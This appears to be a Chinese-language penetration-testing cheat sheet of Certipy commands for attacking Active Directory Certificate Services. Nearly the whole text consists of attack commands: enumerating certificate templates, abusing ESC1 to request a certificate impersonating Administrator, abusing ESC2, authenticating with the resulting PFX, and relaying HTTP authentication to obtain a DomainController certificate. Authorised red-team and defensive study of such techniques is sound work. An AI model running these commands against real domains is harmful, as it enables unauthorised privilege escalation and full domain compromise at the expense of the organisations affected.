# 域渗透

_1 条工具命令_

### Certipy  `certipy-tool`
_ADCS证书服务攻击工具_

**Step 0**
> 枚举证书服务
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip dc_ip
```

**Step 0**
> ESC1模板滥用
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template Template -upn Administrator@domain.com
```

**Step 0**
> ESC2任意用途
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE
```

**Step 0**
> 使用证书认证
_platform: linux_
```
certipy auth -pfx administrator.pfx -domain domain.com
```

**Step 0**
> HTTP中继攻击
_platform: linux_
```
certipy relay -ca ca_server -template DomainController
```

**Step 0**
> 导出PFX证书
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -out user.pfx
```

---
